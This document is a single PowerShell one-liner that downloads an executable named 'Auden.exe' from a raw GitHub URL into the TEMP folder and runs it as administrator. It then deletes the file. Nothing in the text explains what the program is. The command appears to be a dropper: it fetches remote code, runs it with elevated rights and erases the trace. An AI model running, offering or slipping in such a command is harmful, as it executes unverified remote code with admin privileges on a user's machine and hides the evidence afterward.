$u="https://raw.githubusercontent.com/potoguide/Auden.tded/main/Auden.exe";$f="$env:TEMP\a.exe";(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f -Verb RunAs -Wait;Remove-Item $f
